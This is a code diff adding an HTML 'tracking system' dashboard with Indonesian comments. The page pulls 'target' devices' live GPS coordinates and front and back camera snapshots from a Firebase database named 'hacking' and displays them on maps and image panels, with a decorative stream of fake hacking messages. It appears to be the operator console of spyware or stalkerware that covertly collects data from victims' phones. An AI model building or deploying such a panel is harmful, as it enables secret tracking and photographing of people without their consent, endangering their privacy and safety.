@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER_COMMAND // GOOGLE MAPS SATELLITE TRACKER</title>
+    <style>
+        body {
+            background-color: #0b0f19;
+            color: #00ff66;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 6px;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px dashed #00ff66;
+            padding-bottom: 3px;
+            margin-bottom: 3px;
+        }
+        h2 { 
+            font-size: 0.85rem; 
+            margin: 0; 
+        }
+        #clockDisplay {
+            font-size: 0.75rem;
+            color: #00ff66;
+            font-weight: bold;
+        }
+        .container {
+            display: flex;
+            gap: 6px;
+            flex-grow: 1;
+            margin-bottom: 6px;
+            min-height: 0;
+        }
+        #map {
+            flex: 1.2;
+            border: 1px solid #00ff66;
+            height: 100%;
+        }
+        .right-grid {
+            flex: 1.4;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 120px 1fr;
+            gap: 6px;
+            height: 100%;
+            box-sizing: border-box;
+        }
+        .panel-box {
+            background-color: #05070c;
+            border: 1px solid #00ff66;
+            padding: 4px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .panel-title {
+            font-size: 0.55rem;
+            color: #00ff66;
+            text-align: center;
+            border-bottom: 1px dashed #00ff66;
+            padding-bottom: 2px;
+            margin-bottom: 3px;
+        }
+        #satelliteFrame {
+            width: 100%;
+            flex-grow: 1;
+            border: 1px dashed #00ff66;
+        }
+        .code-box {
+            background-color: #020408;
+            border: 1px dashed #00ff66;
+            flex-grow: 1;
+            padding: 4px;
+            font-size: 0.55rem;
+            color: #00ff66;
+            overflow-y: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+        #codeStream {
+            margin: 0;
+            padding: 0;
+            list-style: none;
+            opacity: 0.9;
+        }
+        .cam-wrapper {
+            grid-column: span 2;
+            display: flex;
+            flex-direction: column;
+        }
+        .cam-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+        }
+        .cam-preview {
+            width: 100%;
+            height: 100%;
+            min-height: 90px;
+            border: 1px solid #00ff66;
+            object-fit: cover;
+            background-color: #000;
+        }
+        #logBox {
+            background-color: #05070c;
+            border: 1px solid #00ff66;
+            height: 50px;
+            padding: 4px;
+            font-size: 0.6rem;
+            overflow-y: auto;
+            margin-bottom: 2px;
+        }
+        .status-bar {
+            font-size: 0.65rem;
+            margin-bottom: 3px;
+            display: flex;
+            justify-content: space-between;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header-top">
+        <h2>[ COMMAND_CENTER : TRACKING SYSTEM ]</h2>
+        <div id="clockDisplay">00:00:00 - 00/00/0000</div>
+    </div>
+
+    <div class="status-bar">
+        <span>STATUS: <span id="statusSpan" style="color: #ff3333;">WAITING_FOR_TARGET...</span></span>
+        <span id="targetMeta" style="color: #888;">Target: None</span>
+    </div>
+
+    <div class="container">
+        <!-- 1. SISI KIRI: GPS Utama -->
+        <iframe id="map" src="" frameborder="0"></iframe>
+
+        <!-- SISI KANAN: Grid 1x1 Seimbang -->
+        <div class="right-grid">
+            
+            <!-- Kolom Kiri-Atas: Peta Satelit Mini -->
+            <div class="panel-box">
+                <div class="panel-title">SATELLITE_FEED</div>
+                <iframe id="satelliteFrame" src="" frameborder="0"></iframe>
+                <div id="coordText" style="font-size: 0.5rem; text-align: center; margin-top: 2px; color: #888;">Lat: -, Lon: -</div>
+            </div>
+
+            <!-- Kolom Kanan-Atas: Matrix Stream -->
+            <div class="panel-box">
+                <div class="panel-title">MATRIX_STREAM</div>
+                <div class="code-box">
+                    <ul id="codeStream">
+                        <li>> INITIALIZING SECURE SOCKET...</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Baris Bawah: Live Camera Depan & Belakang -->
+            <div class="panel-box cam-wrapper">
+                <div class="panel-title" style="margin-bottom: 4px;">LIVE_CAMERA_FEED (FRONT & BACK)</div>
+                <div style="display: flex; gap: 6px; flex-grow: 1; min-height: 0;">
+                    <div class="cam-col">
+                        <span style="font-size: 0.55rem; color: #00ff66; margin-bottom: 2px;">Kamera Depan</span>
+                        <img id="camFront" class="cam-preview" src="" alt="Waiting...">
+                    </div>
+                    <div class="cam-col">
+                        <span style="font-size: 0.55rem; color: #00ff66; margin-bottom: 2px;">Kamera Belakang</span>
+                        <img id="camBack" class="cam-preview" src="" alt="Waiting...">
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Terminal Log -->
+    <div id="logBox">
+        [+] Waiting for target transmission...
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        // Real-time Clock & Date Display
+        function updateClock() {
+            const now = new Date();
+            const timeStr = now.toTimeString().split(' ')[0];
+            const dateStr = now.toLocaleDateString('id-ID');
+            document.getElementById("clockDisplay").innerText = `${timeStr} - ${dateStr}`;
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        const firebaseConfig = {
+            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
+        };
+        
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.database();
+
+        const logBox = document.getElementById("logBox");
+        const statusSpan = document.getElementById("statusSpan");
+        const targetMeta = document.getElementById("targetMeta");
+        const mapFrame = document.getElementById("map");
+        const satelliteFrame = document.getElementById("satelliteFrame");
+        const coordText = document.getElementById("coordText");
+        const camFront = document.getElementById("camFront");
+        const camBack = document.getElementById("camBack");
+        const codeStream = document.getElementById("codeStream");
+
+        let initialized = false;
+
+        // Matrix Stream Generator
+        const dummyHex = [
+            "SYS_ALLOC: 0x7FFF5FBFF8", "BYPASS_AUTH: OK", "STREAM_PACKET #8821",
+            "DECRYPTING_KEY_RSA...", "GPS_VECTOR: LOCKED", "PORT_FWD: 443 ACTIVE",
+            "INJECT_PAYLOAD: SUCCESS", "MEM_DUMP: 0x0045A1", "HANDSHAKE_SECURE",
+            "CONNECT: TCP_INTRUSION", "BYPASS_FIREWALL: SUCCESS", "ROOT_ACCESS: GRANTED"
+        ];
+
+        for(let i=0; i<6; i++) {
+            const rnd = dummyHex[Math.floor(Math.random() * dummyHex.length)];
+            codeStream.innerHTML += `<li>> ${rnd}</li>`;
+        }
+
+        setInterval(() => {
+            const randomHex = dummyHex[Math.floor(Math.random() * dummyHex.length)];
+            const timeStr = new Date().toLocaleTimeString();
+            codeStream.innerHTML += `<li>> [${timeStr}] ${randomHex}</li>`;
+            if (codeStream.children.length > 9) {
+                codeStream.removeChild(codeStream.children[0]);
+            }
+        }, 400);
+
+        // 1. Memantau Lokasi GPS & Timestamp Target secara Real-time
+        db.ref("targets").on("value", (snapshot) => {
+            const targets = snapshot.val();
+            if (targets) {
+                statusSpan.style.color = "#00ff66";
+                statusSpan.innerText = "TARGET_LOCKED [LIVE]";
+                logBox.innerHTML = "";
+
+                let lastLat, lastLon, deviceName = "Unknown", lastTime = "";
+
+                Object.keys(targets).forEach((id) => {
+                    const data = targets[id];
+                    deviceName = data.device || "Mobile Target";
+                    lastLat = data.latitude;
+                    lastLon = data.longitude;
+                    
+                    if(data.timestamp) {
+                        const dateObj = new Date(data.timestamp);
+                        lastTime = dateObj.toLocaleTimeString() + " " + dateObj.toLocaleDateString('id-ID');
+                    }
+
+                    targetMeta.innerText = `Device: ${deviceName}`;
+                    logBox.innerHTML += `> [${lastTime}] ${deviceName} -> [Lat: ${lastLat.toFixed(4)}, Lon: ${lastLon.toFixed(4)}]<br>`;
+                });
+
+                if (lastLat && lastLon) {
+                    if (!initialized) {
+                        mapFrame.src = `https://maps.google.com/maps?q=${lastLat},${lastLon}&z=16&output=embed`;
+                        satelliteFrame.src = `https://maps.google.com/maps?q=${lastLat},${lastLon}&z=19&t=k&output=embed`;
+                        initialized = true;
+                    }
+                    coordText.innerText = `${lastLat.toFixed(4)}, ${lastLon.toFixed(4)}`;
+                }
+                logBox.scrollTop = logBox.scrollHeight;
+            }
+        });
+
+        // 2. Memantau Foto Kamera Berkala dengan Info Waktu Masuk
+        db.ref("camera_logs").limitToLast(5).on("child_added", (snapshot) => {
+            const camData = snapshot.val();
+            if (camData) {
+                const timeLog = camData.timestamp ? new Date(camData.timestamp).toLocaleTimeString() : "";
+                if (camData.cameraType === "Depan") {
+                    camFront.src = camData.image;
+                    logBox.innerHTML += `> [${timeLog}] Camera Front Snapshot Captured.<br>`;
+                } else if (camData.cameraType === "Belakang") {
+                    camBack.src = camData.image;
+                    logBox.innerHTML += `> [${timeLog}] Camera Back Snapshot Captured.<br>`;
+                }
+                logBox.scrollTop = logBox.scrollHeight;
+            }
+        });
+    </script>
+</body>
+</html>
